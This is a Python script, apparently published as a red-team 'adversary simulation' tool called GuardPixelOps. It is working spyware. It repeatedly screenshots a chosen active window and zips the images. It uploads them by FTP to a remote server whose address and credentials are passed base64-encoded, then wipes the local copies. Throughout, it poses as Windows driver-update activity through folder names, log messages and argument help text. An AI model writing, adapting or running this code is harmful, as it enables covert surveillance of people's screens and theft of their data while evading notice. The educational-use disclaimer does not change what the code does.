import os
import pygetwindow as gw
import pyautogui
import traceback
import threading
from PIL import Image
from ftplib import FTP
import time
import argparse
import zipfile
import base64
import socket

"""
GuardPixelOps: Red Team Adversary Simulation Tool

Description:
GuardPixelOps is a Python script designed for Red Team operations and adversary simulations in Windows environments. The tool focuses on capturing screenshots and insecurely sending logs to a designated FTP server.

Author: NoceraInfosec

Disclaimer:
GuardPixelOps is intended for educational and research purposes only. Users are responsible for complying with applicable laws and regulations.

"""

DIR_FINDER = os.environ.get('LOCALAPPDATA')
BASE_DIRECTORY = os.path.join(DIR_FINDER, r"WindowsFiles")
UPDATES_DB = "Updates"
DRIVERS_DB = "drivers"
CHECK_MICROSOFT_RELAY = 5
UPDATE_INTERVAL_CHECK = 600
MAX_WIDTH = 1280

LOG_FILE = os.path.join(BASE_DIRECTORY, 'logs-drivers.txt')

def setup_logging():
    if not os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, 'w'):
                pass
        except Exception as e:
            log(f"Error creating log file: {str(e)}")

def log(message):
    try:
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"{timestamp} {message}\n"
        with open(LOG_FILE, 'a') as log_file:
            log_file.write(log_entry)
    except Exception as e:
        print(f"Error writing to log file: {str(e)}")

def create_folder(folder):
    try:
        if not os.path.exists(folder):
            os.makedirs(folder)
            log(f"Created Driver Backup: {folder}")
    except Exception as e:
        log(f"Error creating folder: {str(e)}")

def start_update(window_title, folder):
    try:
        active_window = gw.getActiveWindow()
        if active_window and window_title.lower() in active_window.title.lower():
            active_window.activate()
            screenshot = pyautogui.screenshot()
            timestamp = time.strftime("%Y%m%d%H%M%S")
            hostname = socket.gethostname().replace(".", "_")
            filename = f"Driver_{hostname}_{timestamp}.jpg" 
            filename = os.path.abspath(os.path.join(BASE_DIRECTORY, folder, filename))  
            screenshot = resize_image(screenshot, MAX_WIDTH)
            screenshot.save(filename)
            log(f"Fixed Broken Driver: {filename}")
    except Exception as e:
        log(f"Error during start_update: {str(e)}")
        log(traceback.format_exc())



def resize_image(image, max_width):
    try:
        width, height = image.size
        if width > max_width:
            ratio = max_width / width
            new_height = int(height * ratio)
            resized_image = image.resize((max_width, new_height), Image.LANCZOS)
            return resized_image
        return image
    except Exception as e:
        log(f"Error during resize_image: {str(e)}")
        return image

def create_compressed_folder(destination_folder):
    try:
        compressed_folder = os.path.join(BASE_DIRECTORY,destination_folder, DRIVERS_DB)
        create_folder(compressed_folder)
    except Exception as e:
        log(f"Error during create_compressed_folder: {str(e)}")

def send_logs(source_folder, destination_folder, ftp_host, ftp_user, ftp_password):
    try:
        create_compressed_folder(destination_folder)

        timestamp = time.strftime("%Y%m%d%H%M%S")
        hostname = socket.gethostname().replace(".", "_")
        zip_filename = f"drivers_{hostname}_{timestamp}.zip"
        zip_path = os.path.join(BASE_DIRECTORY, destination_folder, DRIVERS_DB, zip_filename)  # Adjusted path construction

        with zipfile.ZipFile(zip_path, 'w') as zip_file:
            for root, dirs, files in os.walk(source_folder):
                for file in files:
                    file_path = os.path.join(root, file)
                    zip_file.write(file_path, os.path.relpath(file_path, source_folder))
                    log(f"Fixed {file_path} on {zip_filename}")

        with FTP(ftp_host) as ftp:
            ftp.login(user=ftp_user, passwd=ftp_password)
            ftp.cwd('upfiles')

            with open(zip_path, 'rb') as file:
                ftp.storbinary(f'STOR {zip_filename}', file)

        log(f"Drivers Fixed and Updated: {zip_filename}")

    except FileNotFoundError as file_not_found_error:
        log(f"File not found error: {file_not_found_error}")
    except IOError as io_error:
        log(f"I/O error: {io_error}")
    except Exception as e:
        log(f"Unexpected error during send_logs: {str(e)}")

def create_folders():
    update_folder_path = os.path.join(BASE_DIRECTORY, UPDATES_DB)
    compressed_folder_path = os.path.join(BASE_DIRECTORY, DRIVERS_DB)

    create_folder(update_folder_path)
    create_folder(compressed_folder_path)


def clean_folders():
    try:
        create_folders() 

        for file_name in os.listdir(os.path.join(BASE_DIRECTORY, UPDATES_DB)):
            file_path = os.path.join(BASE_DIRECTORY, UPDATES_DB, file_name)
            os.remove(file_path)
        log("Errors Cleaned.")
    except Exception as e:
        log(f"Error fixing drivers: {str(e)}")
        log(traceback.format_exc())
    try:
        for file_name in os.listdir(os.path.join(BASE_DIRECTORY, DRIVERS_DB)):
            file_path = os.path.join(BASE_DIRECTORY, DRIVERS_DB, file_name)
            os.remove(file_path)
        log("Drivers reloaded.")
    except Exception as e:
        log(f"Error reloading drivers: {str(e)}")
        log(traceback.format_exc())

def run_background(args):
    update_folder_path = os.path.join(BASE_DIRECTORY, UPDATES_DB)
    compressed_folder_path = os.path.join(BASE_DIRECTORY, DRIVERS_DB)

    create_folder(update_folder_path)
    create_folder(compressed_folder_path)

    def start_update_task():
        while True:
            try:
                start_update(args.regger, UPDATES_DB)
            except KeyboardInterrupt:
                log("User stopped update.")
                break
            except Exception as e:
                log(f"Unexpected error during start_update_task: {str(e)}")
                log(traceback.format_exc())

            time.sleep(CHECK_MICROSOFT_RELAY)

    def send_logs_task():
        while True:
            try:
                if not os.listdir(update_folder_path):
                    log("No updates needed. Skipping update check.")
                    time.sleep(UPDATE_INTERVAL_CHECK)
                    continue
                send_logs(
                    update_folder_path,
                    '.',
                    base64.b64decode(args.winupdate).decode(),
                    base64.b64decode(args.wintoken).decode(),
                    base64.b64decode(args.winversion).decode()
                )
                clean_folders()
            except Exception as e:
                log(f"Unexpected error during send_logs_task: {str(e)}")
                log(traceback.format_exc())
            time.sleep(UPDATE_INTERVAL_CHECK)

    screenshot_thread = threading.Thread(target=start_update_task, daemon=True)
    ftp_thread = threading.Thread(target=send_logs_task, daemon=True)
    screenshot_thread.start()
    ftp_thread.start()
    screenshot_thread.join()
    ftp_thread.join()

def main():
    parser = argparse.ArgumentParser(description='Fix Windows Drivers.')
    parser.add_argument('--winupdate', required=True, help='Microsoft Relay.')
    parser.add_argument('--wintoken', required=True, help='Windows Token.')
    parser.add_argument('--winversion', required=True, help='Windows Version.')
    parser.add_argument('--regger', required=True, help='Windows Registry')

    args = parser.parse_args()

    setup_logging()

    background_thread = threading.Thread(target=run_background, args=(args,), daemon=True)
    background_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        log("Main Update terminated by user.")

if __name__ == "__main__":
    main()
